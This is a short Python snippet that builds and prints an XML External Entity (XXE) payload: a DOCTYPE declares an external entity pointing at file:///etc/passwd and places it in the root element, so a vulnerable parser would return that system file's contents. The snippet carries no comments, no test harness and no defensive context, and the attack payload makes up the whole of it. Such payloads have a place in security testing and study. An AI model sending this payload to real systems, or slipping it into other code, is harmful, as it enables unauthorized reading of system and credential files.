xml_payload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [ 
  <!ENTITY test SYSTEM "file:///etc/passwd"> ]>
<root>&test;</root>
'''
print(xml_payload)
